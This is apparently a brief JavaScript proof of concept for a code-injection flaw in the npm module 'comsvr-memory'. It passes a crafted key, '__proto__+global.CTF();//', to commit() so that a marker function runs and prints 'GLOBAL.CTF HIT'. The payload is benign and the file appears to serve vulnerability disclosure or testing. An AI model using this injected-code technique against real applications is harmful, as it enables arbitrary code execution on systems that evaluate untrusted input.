var PUT = require('comsvr-memory');
var x = "__proto__+global.CTF();//";
global.CTF = function() {console.log("GLOBAL.CTF HIT")}
try {
	var put = new PUT();
	put.commit(x,x);
} catch (e) {
	console.log(e);
}